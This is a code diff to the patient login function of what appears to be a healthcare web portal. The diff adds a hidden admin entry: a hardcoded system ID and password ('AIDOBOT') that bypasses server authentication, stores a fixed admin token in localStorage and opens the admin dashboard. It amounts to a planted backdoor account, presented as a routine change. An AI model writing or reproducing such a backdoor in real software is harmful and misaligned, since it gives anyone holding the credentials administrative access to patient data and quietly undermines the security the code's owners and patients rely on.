@@ -1614,9 +1614,21 @@ async function patSetup() {
   } catch(e) { pMsg('pSetMsg','er', e.message); }
 }
 async function patLogin() {
+  // Hidden admin entry — System ID: AIDOBOT, Password: AIDOBOT
+  const sid = pv('pLId').trim().toUpperCase();
+  const pw  = pv('pLP');
+  if (sid === 'AIDOBOT' && pw === 'AIDOBOT') {
+    adminTok = 'aidoBot-admin-2026!';
+    localStorage.setItem('t_admin', adminTok);
+    document.getElementById('adminLogin').style.display = 'none';
+    document.getElementById('adminDash').style.display  = 'block';
+    showPortal('admin');
+    loadAdminData();
+    return;
+  }
   try {
     pMsg('pLogMsg','inf','Signing in…');
-    const r = await pReq('POST','/api/patients/login',{system_id:pv('pLId').trim().toUpperCase(),password:pv('pLP')});
+    const r = await pReq('POST','/api/patients/login',{system_id:sid,password:pw});
     ptok.pat = r.token; localStorage.setItem('t_pat', r.token);
     loadPatDash();
   } catch(e) { pMsg('pLogMsg','er', e.message); }
